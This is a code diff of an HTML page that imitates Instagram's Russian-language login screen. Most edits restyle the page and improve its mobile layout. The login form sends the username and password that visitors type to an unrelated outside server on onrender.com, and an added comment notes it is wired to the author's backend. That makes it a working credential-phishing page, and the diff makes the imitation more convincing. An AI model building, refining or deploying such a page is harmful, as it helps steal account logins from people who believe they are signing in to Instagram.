@@ -8,7 +8,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-
+        
+        /* Базовые стили */
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: #fafafa;
@@ -19,71 +20,57 @@
             align-items: center;
             min-height: 100vh;
         }
-
         .container {
             display: flex;
-            max-width: 1200px;
+            max-width: 1300px;
             width: 100%;
             margin: 20px;
-            background: white;
-            border: 1px solid #dbdbdb;
         }
-
         .left-side {
             flex: 1;
-            padding: 50px 60px 40px 80px;
+            padding: 60px 80px 40px 40px;
             text-align: left;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
         }
-
         .instagram-logo {
-            width: 175px;
-            height: 50px;
-            margin-bottom: 30px;
+            width: 78px;
+            height: 78px;
+            margin-bottom: 24px;
         }
-
         .left-side h1 {
-            font-size: 26px;
-            line-height: 1.35;
-            font-weight: 400;
+            font-size: 27px;
+            line-height: 1.32;
+            font-weight: 500;
+            margin-bottom: 38px;
             color: #262626;
-            margin-bottom: 40px;
         }
-
         .pink { color: #e1306c; }
-
         .collage-container {
             position: relative;
-            max-width: 520px;
+            max-width: 460px;
         }
-
         .collage {
             width: 100%;
-            border-radius: 12px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            border-radius: 18px;
+            display: block;
         }
-
         .right-side {
             width: 380px;
-            padding: 32px 40px;
+            padding: 40px 35px;
+            border-left: 1px solid #dbdbdb;
             display: flex;
             flex-direction: column;
             align-items: center;
-            border-left: 1px solid #dbdbdb;
+            background: #fff;
         }
-
         .title {
-            font-size: 20px;
+            font-size: 23px;
             font-weight: 600;
-            margin: 8px 0 24px;
+            margin: 10px 0 28px;
             color: #262626;
         }
-
         input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 13px 12px;
             margin-bottom: 12px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
@@ -91,136 +78,81 @@
             font-size: 15px;
             box-sizing: border-box;
         }
-
         button {
             width: 100%;
-            padding: 9px;
+            padding: 12px;
             background: #0095f6;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 8px;
             font-weight: 600;
-            font-size: 15px;
+            font-size: 16px;
             cursor: pointer;
-            margin: 12px 0 8px;
+            margin: 10px 0 8px;
         }
-
-        .forgot {
-            color: #0095f6;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 10px 0 18px;
-        }
-
-        .fb-btn {
+        .forgot, .fb-btn, .create-account {
             width: 100%;
-            padding: 10px;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .fb-btn {
             background: #1877f2;
             color: white;
-            border: none;
-            border-radius: 10px;
-            font-weight: 600;
+            padding: 12px;
+            border-radius: 8px;
+            text-decoration: none;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            text-decoration: none;
-            margin-bottom: 15px;
-            font-size: 15px;
+            gap: 10px;
         }
 
-        .create-account {
-            color: #0095f6;
-            text-decoration: none;
-            font-size: 15px;
-            font-weight: 600;
-            margin-top: 10px;
-        }
-
-        .meta-logo {
-            margin-top: 30px;
-            width: 60px;
-        }
-
-        /* Footer */
-        footer {
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #8e8e8e;
-            background: #fafafa;
-            border-top: 1px solid #dbdbdb;
-        }
-
-        footer a {
-            color: #8e8e8e;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        /* Мобильная версия */
+        /* ========================= МОБИЛЬНАЯ ОПТИМИЗАЦИЯ ========================= */
         @media (max-width: 900px) {
-            .container { flex-direction: column; border: none; margin: 0; }
-            .left-side { padding: 40px 20px; text-align: center; }
-            .right-side { width: 100%; border-left: none; border-top: 1px solid #dbdbdb; padding: 30px 20px; }
-            .instagram-logo { width: 140px; height: 40px; }
+            .container { flex-direction: column; align-items: center; margin: 0; }
+            .left-side { padding: 30px 20px 20px; text-align: center; }
+            .left-side h1 { font-size: 22px; margin-bottom: 24px; }
+            .collage-container { max-width: 100%; }
+            .right-side { width: 100%; max-width: 420px; border-left: none; border-top: 1px solid #dbdbdb; padding: 30px 20px; box-sizing: border-box; }
+        }
+        @media (max-width: 600px) {
+            body { align-items: flex-start; background: #fff; }
+            .container { width: 100%; }
+            .left-side { padding: 25px 16px 10px; }
+            .instagram-logo { width: 64px; height: 64px; margin-bottom: 18px; }
+            .left-side h1 { font-size: 19px; line-height: 1.45; }
+            .collage { border-radius: 12px; }
+            .right-side { width: 100%; max-width: 100%; padding: 24px 16px; border-top: none; }
+            .title { font-size: 20px; margin-bottom: 22px; }
+            input { font-size: 16px; padding: 14px 12px; }
+            button, .fb-btn { padding: 14px; font-size: 15px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Левая часть -->
         <div class="left-side">
-            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" 
-                 class="instagram-logo" alt="Instagram">
-            
+            <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" class="instagram-logo" alt="Instagram Logo">
             <h1>Посмотрите, какими моментами<br>из жизни поделились ваши<br><span class="pink">близкие друзья.</span></h1>
-            
             <div class="collage-container">
-                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" 
-                     class="collage" alt="Stories Collage">
+                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" class="collage" alt="Stories Collage">
             </div>
         </div>
-
-        <!-- Правая часть -->
         <div class="right-side">
             <div class="title">Войти в Instagram</div>
             
+            <!-- Подключено к твоему бэкенду -->
             <form action="https://insta-l177.onrender.com/" method="POST">
                 <input type="text" name="username" placeholder="Имя пользователя, номер мобильного телефона или электронный адрес" required>
                 <input type="password" name="password" placeholder="Пароль" required>
                 <button type="submit">Войти</button>
             </form>
-
             <a href="#" class="forgot">Забыли пароль?</a>
-            
             <a href="#" class="fb-btn">
                 <i class="fab fa-facebook-square"></i> Войти через Facebook
             </a>
-            
             <a href="#" class="create-account">Создать новый аккаунт</a>
-
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIHh0pVwTAebw6C7-IEi_XJAON9ZFIv0S9og&s" 
-                 class="meta-logo" alt="Meta">
         </div>
     </div>
-
-    <!-- Footer -->
-    <footer>
-        <div>
-            Meta • Информация • Блог • Вакансии • Помощь • API • Конфиденциальность • 
-            Настройки файлов cookie • Условия • Места • Популярное • Instagram Lite • 
-            Meta AI • Threads
-        </div>
-        <div style="margin-top: 8px;">
-            Загрузка контактов и лица, не являющиеся пользователями • Meta Verified
-        </div>
-        <div style="margin-top: 12px;">
-            Русский © 2026 Instagram from Meta
-        </div>
-    </footer>
 </body>
 </html>
